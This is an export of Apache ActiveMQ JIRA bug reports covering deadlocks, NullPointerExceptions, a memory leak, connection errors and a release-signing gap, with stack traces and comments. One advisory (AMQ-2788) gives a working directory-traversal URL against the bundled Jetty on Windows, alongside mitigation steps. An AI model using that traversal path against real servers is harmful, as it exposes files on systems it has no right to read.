Thanks.;;;","12/Mar/13 05:49;wangyin;Anish said he can reproduce the issue when he uses the pure master/slave and the master is waiting for the slave to be attached.
I think the master is half-started and unable to communicate with clients so I said ""You can not talk to the master which the slave is not attached to"".
The issue can not be reproduced when I use AMQ 5.7 in my test,I'm not sure how the issue of this case is solved at the moment.;;;","31/Jan/15 16:30;smil;I just met this problem in our environment. 

My stacktrace revelas the same dead-lock, but with a different command:
""default-threads - 38"" prio=10 tid=0x000000001803f800 nid=0x4dd4 waiting on condition [0x00002aced9085000]
   java.lang.Thread.State: WAITING (parking)
        at sun.misc.Unsafe.park(Native Method)
        - parking to wait for  <0x00000000b07c6010> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject)
        at java.util.concurrent.locks.LockSupport.park(LockSupport.java:186)
        at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2043)
        at java.util.concurrent.ArrayBlockingQueue.take(ArrayBlockingQueue.java:374)
        at org.apache.activemq.transport.FutureResponse.getResult(FutureResponse.java:40)
        at org.apache.activemq.transport.ResponseCorrelator.request(ResponseCorrelator.java:87)
        at org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1406)
        at org.apache.activemq.ActiveMQConnection.cleanup(ActiveMQConnection.java:1626)
        at org.apache.activemq.ra.ActiveMQManagedConnection.cleanup(ActiveMQManagedConnection.java:235)
        at org.jboss.jca.core.connectionmanager.pool.mcp.SemaphoreArrayListManagedConnectionPool.returnConnection(SemaphoreArrayListManagedConnectionPool.java:435)
        at org.jboss.jca.core.connectionmanager.pool.AbstractPool.returnConnection(AbstractPool.java:561)
        at org.jboss.jca.core.connectionmanager.AbstractConnectionManager.returnManagedConnection(AbstractConnectionManager.java:425)
        at org.jboss.jca.core.connectionmanager.listener.TxConnectionListener$TransactionSynchronization.afterCompletion(TxConnectionListener.java:732)
        at org.jboss.jca.core.connectionmanager.transaction.TransactionSynchronizer.invokeAfter(TransactionSynchronizer.java:380)
        at org.jboss.jca.core.connectionmanager.transaction.TransactionSynchronizer.afterCompletion(TransactionSynchronizer.java:329)
        at com.arjuna.ats.internal.jta.resources.arjunacore.SynchronizationImple.afterCompletion(SynchronizationImple.java:96)
        at com.arjuna.ats.arjuna.coordinator.TwoPhaseCoordinator.afterCompletion(TwoPhaseCoordinator.java:402)
        - locked <0x00000000b072ab98> (a java.lang.Object)
        at com.arjuna.ats.arjuna.coordinator.TwoPhaseCoordinator.end(TwoPhaseCoordinator.java:103)
        at com.arjuna.ats.arjuna.AtomicAction.commit(AtomicAction.java:162)
        at com.arjuna.ats.internal.jta.transaction.arjunacore.TransactionImple.commitAndDisassociate(TransactionImple.java:1165)
        at com.arjuna.ats.internal.jta.transaction.arjunacore.BaseTransaction.commit(BaseTransaction.java:126)
        at com.arjuna.ats.jbossatx.BaseTransactionManagerDelegate.commit(BaseTransactionManagerDelegate.java:75)
        at org.jboss.as.ejb3.inflow.MessageEndpointInvocationHandler.afterDelivery(MessageEndpointInvocationHandler.java:72)
        at sun.reflect.GeneratedMethodAccessor128.invoke(Unknown Source)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
        at java.lang.reflect.Method.invoke(Method.java:606)
        at org.jboss.as.ejb3.inflow.AbstractInvocationHandler.handle(AbstractInvocationHandler.java:60)
        at org.jboss.as.ejb3.inflow.MessageEndpointInvocationHandler.doInvoke(MessageEndpointInvocationHandler.java:136)
        at org.jboss.as.ejb3.inflow.AbstractInvocationHandler.invoke(AbstractInvocationHandler.java:73)
        at com.sun.proxy.$Proxy151.afterDelivery(Unknown Source)
        at org.apache.activemq.ra.MessageEndpointProxy$MessageEndpointAlive.afterDelivery(MessageEndpointProxy.java:128)
        at org.apache.activemq.ra.MessageEndpointProxy.afterDelivery(MessageEndpointProxy.java:69)
        at org.apache.activemq.ra.ServerSessionImpl.afterDelivery(ServerSessionImpl.java:225)
        at org.apache.activemq.ActiveMQSession.run(ActiveMQSession.java:1029)
        at org.apache.activemq.ra.ServerSessionImpl.run(ServerSessionImpl.java:169)
        at org.jboss.jca.core.workmanager.WorkWrapper.run(WorkWrapper.java:218)
        at org.jboss.threads.SimpleDirectExecutor.execute(SimpleDirectExecutor.java:33)
        at org.jboss.threads.QueueExecutor.runTask(QueueExecutor.java:808)
        at org.jboss.threads.QueueExecutor.access$100(QueueExecutor.java:45)
        at org.jboss.threads.QueueExecutor$Worker.run(QueueExecutor.java:849)
        at java.lang.Thread.run(Thread.java:744)
        at org.jboss.threads.JBossThread.run(JBossThread.java:122)
;;;","31/Jan/15 20:04;smil;Actially there is a general problem behind the scenes:

The component ResponseCorrelator is written in an optimistic manner. The assumption is that in case a command sent to the broker, an answer will reach us guaranteed.

This is not true in case of failover situations. It might happen, that we were able to serialize the last bit of the command just before the broker has crashed/killed. This is true for the failover-transport as well.

This means ResponseCorrelator could hang forever at very different locations.

The solution would be to define a time-to-live for the commands. Some of the commands do have timeout, the calling code also takes care of timeouts. (Callers without timeout does not cope with the situation well. In my case I interrupted the above thread, and then JBoss started to process the messages using two different processors at the same time). Thus, ResponseCorrelator should repeat the command to the server using the same commandID(?). 
In case the command ID is known to the failover-transport (ResponseMap) it might ignore the resend, because most likely it is still attempting to send it. TTL could be a larger number like 30-40 sec with infinite as default.




;;;","02/Mar/17 14:54;roydar;Issue still happening in 5.13.0:

sun.misc.Unsafe.park(Native Method)
java.util.concurrent.locks.LockSupport.park(LockSupport.java:175)
java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039)
java.util.concurrent.ArrayBlockingQueue.take(ArrayBlockingQueue.java:403)
org.apache.activemq.transport.FutureResponse.getResult(FutureResponse.java:48)
org.apache.activemq.transport.ResponseCorrelator.request(ResponseCorrelator.java:87)
org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1381)
org.apache.activemq.ActiveMQConnection.ensureConnectionInfoSent(ActiveMQConnection.java:1495)
org.apache.activemq.ActiveMQConnection.start(ActiveMQConnection.java:522)
;;;","08/Mar/17 12:21;samion;We are also experiencing this occasional hang with master/slave configuration using 5.11.1.

{code}
        sun.misc.Unsafe.park(Native Method)
        java.util.concurrent.locks.LockSupport.park(LockSupport.java:175)
        java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039)
        java.util.concurrent.ArrayBlockingQueue.take(ArrayBlockingQueue.java:403)
        org.apache.activemq.transport.FutureResponse.getResult(FutureResponse.java:40)
        org.apache.activemq.transport.ResponseCorrelator.request(ResponseCorrelator.java:87)
        org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1387)
        org.apache.activemq.ActiveMQConnection.ensureConnectionInfoSent(ActiveMQConnection.java:1501)
        org.apache.activemq.ActiveMQConnection.createSession(ActiveMQConnection.java:323)
        org.springframework.jms.support.JmsAccessor.createSession(JmsAccessor.java:192)
{code}
;;;","08/Mar/17 14:24;roydar;Yes, we have validated that the issue was resolved in version 5.14.0
https://issues.apache.org/jira/browse/AMQ-6362
;;;","09/May/22 17:13;sthalasayanam;I use CMS version 3.9.5 in my project. Occasionally, the client crashes/hangs at this location. I guess the problem is not yet solved.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
KEYS file does not include A2F9E313 which was used to sign the 5.3.2 release,AMQ-2797,12482928,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Blocker,Fixed,,sebb,,24/Jun/10 08:37,09/Jul/11 16:35,14/Jul/23 05:43,09/Jul/11 16:35,,,,,,,,,,,,,0,,,,,,,,,"The KEYS file does not include A2F9E313 which was used to sign the 5.3.2 release.

Furthermore, the key A2F9E313 does not appear to be available from the pgp.mit.edu server.

This means that it is impossible to check the integrity of the release.

","http://www.apache.org/dist/activemq/apache-activemq/KEYS
http://activemq.apache.org/activemq-532-release.html",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,68664,,,Sat Jul 09 16:35:57 UTC 2011,,,,,,,,,,,"0|i0rzr3:",161436,,,,,,,,,,,,,,,,,,,,,"18/Jan/11 12:40;sebb;The A2F9E313 key is now in the KEYS file, however it does not appear to be available from the pgp server.;;;","09/Jul/11 16:35;tabish;This appears to be fixed now.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
javax.jms.JMSException: User name or password is invalid --> activemq-admin browse --amqurl tcp://localhost:61616 TEST.FOO,AMQ-2794,12482930,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,cmoulliard,cmoulliard,23/Jun/10 16:00,02/Nov/13 22:19,14/Jul/23 05:43,02/Nov/13 22:19,5.3.0,,,,,5.6.0,,,,,,,0,,,,,,,,,"When security is enable on ActiveMq 5.3.1, the following command 

activemq-admin browse --amqurl tcp://localhost:61616 TEST.FOO 

generates the error :

{code}
[root@mombrks10 bin]# ./activemq-admin browse --amqurl tcp://localhost:64011  Q.INAMEDIA.GESCOM.PANIER.P
Java Runtime: Sun Microsystems Inc. 1.6.0_20 /usr/java/jre1.6.0_20
  Heap sizes: current=15680k  free=15284k  max=251456k
    JVM args: -Dactivemq.classpath=/ap03/brokermutd1/appl/conf; -Dactivemq.home=/ap03/brokermutd1/appl -Dactivemq.base=/ap03/brokermutd1/appl
ACTIVEMQ_HOME: /ap03/brokermutd1/appl
ACTIVEMQ_BASE: /ap03/brokermutd1/appl
ERROR: java.lang.RuntimeException: Failed to execute browse task. Reason: javax.jms.JMSException: User name or password is invalid.
java.lang.RuntimeException: Failed to execute browse task. Reason: javax.jms.JMSException: User name or password is invalid.
        at org.apache.activemq.console.command.AmqBrowseCommand.runTask(AmqBrowseCommand.java:130)
        at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)
        at org.apache.activemq.console.command.ShellCommand.runTask(ShellCommand.java:136)
        at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)
        at org.apache.activemq.console.command.ShellCommand.main(ShellCommand.java:82)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)
        at java.lang.reflect.Method.invoke(Unknown Source)
        at org.apache.activemq.console.Main.runTaskClass(Main.java:251)
        at org.apache.activemq.console.Main.main(Main.java:107)

{code}

If we use the command activemq-admin query --jmxuser=monitorRole --jmxpassword=abc123, it works",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74799,,,Thu Nov 03 17:48:31 UTC 2011,,,,,,,,,,,"0|i0eatz:",81517,,,,,,,,,,,,,,,,,,,,,"03/Nov/11 17:33;callain_accovia;Same issue for me, how to pass the username and password to the activemq-admin browse operation??? Not documented or a lack of feature?
;;;","03/Nov/11 17:48;callain_accovia;I saw a fix in 5.6, can it be backported to 5.3.x or at least 5.5.x?

https://issues.apache.org/jira/browse/AMQ-3411;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
KahaDB store default directory,AMQ-2793,12482945,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Minor,Fixed,dejanb,dejanb,dejanb,23/Jun/10 10:59,23/Jun/10 11:01,14/Jul/23 05:43,23/Jun/10 11:01,5.3.2,,,,,5.4.0,,,,,,,0,,,,,,,,,"Add default directory for KahaDB message store.

If adapter is set simply with 

{code}broker.setPersistenceAdapter(KahaDBPersistenceAdapter()){code}

it will result in NPE during broker start.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74800,,,Wed Jun 23 11:01:39 UTC 2010,,,,,,,,,,,"0|i0rr3b:",160033,,,,,,,,,,,,,,,,,,,,,"23/Jun/10 11:01;dejanb;Fixed with svn revision 957154;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Directory Traversal Vulnerability,AMQ-2788,12482941,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,dejanb,dejanb,22/Jun/10 07:32,22/Jun/10 07:36,14/Jul/23 05:43,22/Jun/10 07:32,5.3.1,5.3.2,,,,5.4.0,,,,,,,0,,,,,,,,,"Due to vulnerability in Jetty's ResourceHandler (http://jira.codehaus.org/browse/JETTY-1004), ActiveMQ installations on Windows are prone to this vulnerability. For example you can see the README file by entering the following url: http://localhost:8161/\../\../README.txt

This is solved by moving to 7.x Jetty version on trunk and upcoming 5.4.0 release.

People affected with this issue should either upgrade manually to Jetty 6.1.17 or remove resource handler declaration by commenting out or deleting the following snippet from jetty.xml:

                   <bean class=""org.mortbay.jetty.handler.ContextHandler"">
                       <property name=""contextPath"" value=""/""/>
                       <property name=""handler"">
                           <bean class=""org.mortbay.jetty.handler.ResourceHandler"">
                               <property name=""welcomeFiles"">
                                   <list>
                                       <value>index.html</value>
                                   </list>
                               </property>
                               <property name=""resourceBase"" value=""${activemq.base}/webapps/static/""/>
                           </bean> 
                       </property>
                   </bean>",Windows,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74801,,,2010-06-22 07:32:10.0,,,,,,,,,,,"0|i0rquv:",159995,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Network of Brokers becomes overwhelmed with Advisory Messages on Temporary Queues,AMQ-2782,12482969,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,dejanb,dejanb,17/Jun/10 08:33,17/Jun/10 14:57,14/Jul/23 05:43,17/Jun/10 14:57,5.3.2,,,,,5.4.0,,,Broker,,,,0,,,,,,,,,,,mpaladin,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74803,,,Thu Jun 17 14:57:14 UTC 2010,,,,,,,,,,,"0|i0rq6v:",159887,,,,,,,,,,,,,,,,,,,,,"17/Jun/10 14:57;dejanb;Fixed with svn revision 955621;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
NullPointerException during createDurableSubscriber(),AMQ-2781,12482983,,Bug,Closed,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,rajdavies,kevan,kevan,16/Jun/10 14:43,16/Jun/10 16:38,14/Jul/23 05:43,16/Jun/10 15:14,5.4.0,,,,,5.4.0,,,,,,,0,,,,,,,,,"During testing, ran into the following NullPointerException:

06-15-2010 21:06:44:  ERROR: javax.jms.JMSException: java.lang.NullPointerException
	at org.apache.activemq.util.JMSExceptionSupport.create(JMSExceptionSupport.java:49)
	at org.apache.activemq.ActiveMQConnection.syncSendPacket(ActiveMQConnection.java:1286)
	at org.apache.activemq.ActiveMQSession.syncSendPacket(ActiveMQSession.java:1873)
	at org.apache.activemq.ActiveMQMessageConsumer.(ActiveMQMessageConsumer.java:249)
	at org.apache.activemq.ActiveMQTopicSubscriber.(ActiveMQTopicSubscriber.java:117)
	at org.apache.activemq.ActiveMQSession.createDurableSubscriber(ActiveMQSession.java:1275)
	at org.apache.activemq.ActiveMQSession.createDurableSubscriber(ActiveMQSession.java:1220)
	at org.apache.activemq.ra.ManagedSessionProxy.createDurableSubscriber(ManagedSessionProxy.java:175)
	at org.apache.activemq.ActiveMQTopicSession.createDurableSubscriber(ActiveMQTopicSession.java:147)
        ...
Caused by: java.lang.NullPointerException
	at org.apache.activemq.broker.region.Topic.deleteSubscription(Topic.java:168)
	at org.apache.activemq.broker.region.TopicRegion.addConsumer(TopicRegion.java:86)
	at org.apache.activemq.broker.region.RegionBroker.addConsumer(RegionBroker.java:407)
	at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:89)
	at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:89)
	at org.apache.activemq.advisory.AdvisoryBroker.addConsumer(AdvisoryBroker.java:91)
	at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:89)
	at org.apache.activemq.broker.BrokerFilter.addConsumer(BrokerFilter.java:89)
	at org.apache.activemq.broker.MutableBrokerFilter.addConsumer(MutableBrokerFilter.java:95)
	at org.apache.activemq.broker.TransportConnection.processAddConsumer(TransportConnection.java:543)
	at org.apache.activemq.command.ConsumerInfo.visit(ConsumerInfo.java:349)
	at org.apache.activemq.broker.TransportConnection.service(TransportConnection.java:306)
	at org.apache.activemq.broker.TransportConnection$1.onCommand(TransportConnection.java:182)
	at org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:69)
	at org.apache.activemq.transport.WireFormatNegotiator.onCommand(WireFormatNegotiator.java:113)
	at org.apache.activemq.transport.InactivityMonitor.onCommand(InactivityMonitor.java:217)
	at org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
	at org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:219)
	at org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:201)
	at java.lang.Thread.run(Thread.java:619)

Fix seems pretty straightforward.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"16/Jun/10 14:46;kevan;AMQ-2781.patch;https://issues.apache.org/jira/secure/attachment/12461742/AMQ-2781.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74804,,,Wed Jun 16 16:38:17 UTC 2010,,,,,,,,,,,"0|i0rr7b:",160051,,,,,,,,,,,,,,,,,,,,,"16/Jun/10 14:46;kevan;Not yet tested, but seems to be an obvious fix...;;;","16/Jun/10 15:14;rajdavies;Fixed by SVN revision 955039;;;","16/Jun/10 16:38;kevan;thanks. sorry i didn't notice your updates
...
;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Memory leak with ManagedRegionBroker,AMQ-2778,12483643,,Bug,Closed,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,brice,brice,14/Jun/10 10:26,20/Sep/11 11:01,14/Jul/23 05:43,20/Sep/11 11:01,5.3.2,,,,,5.6.0,,,JMX,,,,0,,,,,,,,,There are memory leak with the ManagedRegionBroker,Sun Solaris,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"14/Jun/10 10:33;brice;ManagedRegionBroker.jpeg;https://issues.apache.org/jira/secure/attachment/12461738/ManagedRegionBroker.jpeg","21/Jul/10 08:52;brice;activemq.properties;https://issues.apache.org/jira/secure/attachment/12461707/activemq.properties","21/Jul/10 08:52;brice;activemq.xml;https://issues.apache.org/jira/secure/attachment/12461773/activemq.xml","21/Jul/10 08:52;brice;broker1.properties;https://issues.apache.org/jira/secure/attachment/12461719/broker1.properties",,,,,,,,,,,,,,,,,,4.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,60023,,,Tue Sep 20 11:01:40 UTC 2011,,,,,,,,,,,"0|i0akf3:",59581,Regression,,,,,,,,,,,,,,,,,,,,"14/Jun/10 10:33;brice;I used MAT to detect memory leak;;;","20/Jul/10 10:41;rajdavies;Can you provide some more information ? - a test case would be ideal. JMX Objects do take up a lot of memory - is this in normal operation ? (do you see this when re-started ?).;;;","21/Jul/10 08:50;brice;I do not have test case, but if I set useJmx=""false"" in the broker,  the memory leak disappear. I can provide my configuration files in attachement.;;;","29/Jun/11 21:52;tabish;Not test case or information allowing this to be tested or reproduced.;;;","20/Sep/11 10:56;gtully;reopen to set fix version to 5.6;;;","20/Sep/11 11:01;gtully;closing again with correct fix version;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Connection refused when using shortname in activemqurl,AMQ-2776,12482393,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,viola.lu,viola.lu,13/Jun/10 11:04,09/Aug/10 09:41,14/Jul/23 05:43,09/Aug/10 09:41,5.3.2,5.4.0,,,,5.4.0,,,Connector,,,,1,,,,,,,,,"1. On server suse10sp268, start activemq , then run activemq-admin.bat browse --amqurl tcp://suse10sp268:61616 TEST.FOO , got excecption Caused by: javax.jms.JMSException: Could not connect to broker URL: tcp://suse10sp268:61616. Reason: java.net.ConnectException: Connection refused: connect
at org.apache.activemq.util.JMSExceptionSupport.create(JMSExceptionSupport.java:35)
at org.apache.activemq.ActiveMQConnectionFactory.createActiveMQConnection(ActiveMQConnectionFactory.java:286)
at org.apache.activemq.ActiveMQConnectionFactory.createConnection(ActiveMQConnectionFactory.java:185)
at org.apache.activemq.ra.ActiveMQConnectionSupport.makeConnection(ActiveMQConnectionSupport.java:79)
at org.apache.activemq.ra.ActiveMQConnectionSupport.makeConnection(ActiveMQConnectionSupport.java:61)
at org.apache.activemq.ra.ActiveMQManagedConnectionFactory.createManagedConnection(ActiveMQManagedConnectionFactory.java:169)
... 42 more
Caused by: java.net.ConnectException: Connection refused: connect
at java.net.PlainSocketImpl.socketConnect(Native Method)
at java.net.PlainSocketImpl.doConnect(PlainSocketImpl.java:333)
at java.net.PlainSocketImpl.connectToAddress(PlainSocketImpl.java:195)
at java.net.PlainSocketImpl.connect(PlainSocketImpl.java:182)
at java.net.SocksSocketImpl.connect(SocksSocketImpl.java:366)
at java.net.Socket.connect(Socket.java:519)
at org.apache.activemq.transport.tcp.TcpTransport.connect(TcpTransport.java:483)
at org.apache.activemq.transport.tcp.TcpTransport.doStart(TcpTransport.java:446)
at org.apache.activemq.util.ServiceSupport.start(ServiceSupport.java:53)
at org.apache.activemq.transport.TransportFilter.start(TransportFilter.java:58)
at org.apache.activemq.transport.TransportFilter.start(TransportFilter.java:58)
at org.apache.activemq.transport.WireFormatNegotiator.start(WireFormatNegotiator.java:72)
at org.apache.activemq.transport.TransportFilter.start(TransportFilter.java:58)
at org.apache.activemq.transport.TransportFilter.start(TransportFilter.java:58)
at org.apache.activemq.ActiveMQConnectionFactory.createActiveMQConnection(ActiveMQConnectionFactory.java:266)

This  happened also when got error starting activemq-ra module in geronimo
https://issues.apache.org/jira/browse/GERONIMO-5371",Suse 10 Sp2,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"30/Jun/10 01:51;xuhaihong;activemq-2776.patch;https://issues.apache.org/jira/secure/attachment/12461755/activemq-2776.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74805,,,Mon Aug 09 09:41:08 UTC 2010,,,,,,,,,,,"0|i0rqpb:",159970,,,,,,,,,,,,,,,,,,,,,"14/Jun/10 10:20;gtully;Is this a case of https://issues.apache.org/activemq/browse/AMQ-2094 - does the broker transportConnector use localhost?;;;","21/Jun/10 07:38;viola.lu;This case is different from amq-2094 case. activemq.sh can bind connector with full/short server host name.

1. Server suse10sp268, i add its ip map into /etc/hosts
9.186.10.68     suse10sp268.site suse10sp268
2.Edit its acitvemq.xml with :
<transportConnectors>
            <transportConnector name=""openwire"" uri=""tcp://suse10sp268:61616""/>
</transportConnectors>

3. Start activemq
 INFO | ActiveMQ 5.3.2 JMS Message Broker (share) is starting
 INFO | For help or more information please see: http://activemq.apache.org/
 INFO | Kaha Store using data directory /share/kr-store/data
 INFO | Listening for connections at: tcp://suse10sp268.site:61616
 INFO | Connector openwire Started
 INFO | ActiveMQ JMS Message Broker (share, ID:suse10sp268-49309-1277133128502-0:0) started
 INFO | Logging to org.slf4j.impl.JCLLoggerAdapter(org.mortbay.log) via org.mortbay.log.Slf4jLog
 INFO | jetty-6.1.9
 INFO | ActiveMQ WebConsole initialized.

4. Then i run 
activemq-admin.sh browse --amqurl tcp://suse10sp268:61616 TEST.FOO, it will report error,
ERROR: java.lang.RuntimeException: Failed to execute browse task. Reason: javax.jms.JMSException: Could not connect to broker URL: tcp://suse10sp268:61616. Reason: java.net.ConnectException: Connection refused
java.lang.RuntimeException: Failed to execute browse task. Reason: javax.jms.JMSException: Could not connect to broker URL: tcp://suse10sp268:61616. Reason: java.net.ConnectException: Connection refused
        at org.apache.activemq.console.command.AmqBrowseCommand.runTask(AmqBrowseCommand.java:130)
        at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)
        at org.apache.activemq.console.command.ShellCommand.runTask(ShellCommand.java:136)
        at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)
        at org.apache.activemq.console.command.ShellCommand.main(ShellCommand.java:82)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
        at java.lang.reflect.Method.invoke(Method.java:597)
        at org.apache.activemq.console.Main.runTaskClass(Main.java:251)
        at org.apache.activemq.console.Main.main(Main.java:107)
ERROR: java.lang.Exception: javax.jms.JMSException: Could not connect to broker URL: tcp://suse10sp268:61616. Reason: java.net.ConnectException: Connection refused
java.lang.Exception: javax.jms.JMSException: Could not connect to broker URL: tcp://suse10sp268:61616. Reason: java.net.ConnectException: Connection refused
        at org.apache.activemq.console.command.AmqBrowseCommand.runTask(AmqBrowseCommand.java:131)
        at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)
